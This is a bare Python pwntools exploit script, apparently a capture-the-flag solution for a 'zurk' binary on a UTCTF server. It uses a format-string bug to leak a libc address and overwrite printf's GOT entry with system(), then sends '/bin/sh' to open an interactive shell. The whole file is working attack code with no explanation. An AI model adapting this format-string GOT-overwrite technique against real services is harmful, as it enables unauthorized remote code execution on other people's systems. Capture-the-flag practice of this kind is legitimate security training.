#!/usr/bin/env python

from pwn import *

libc = ELF('libc-2.23.so')

#p = process('./zurk')
p = remote('binary.utctf.live',9003)

p.recvuntil('to do?')
p.sendline('%7$p')
_IO_2_1_stdout_ = int(p.recvuntil('to do?').split()[0],0)
_IO_2_1_stdout_offset = libc.symbols['_IO_2_1_stdout_']
base = _IO_2_1_stdout_ - _IO_2_1_stdout_offset

zurk=ELF('zurk')
_printf = zurk.got['printf']

__libc_system = libc.symbols['system']
address = base + __libc_system
words=[ address & 0xFFFF, (address >> 16) & 0xFFFF ]

assert(words[0] < words[1])

payload = ""
payload += "%" + str(words[0]).rjust(6,'0') + "x"
payload += "%0010$hn"
payload += "%" + str(words[1]-words[0]).rjust(6,'0') + "x"
payload += "%0011$hn"
payload += p64(_printf)
payload += p64(_printf + 2)

p.sendline(payload)
p.recvuntil('to do?')

p.sendline('/bin/sh')

p.interactive()
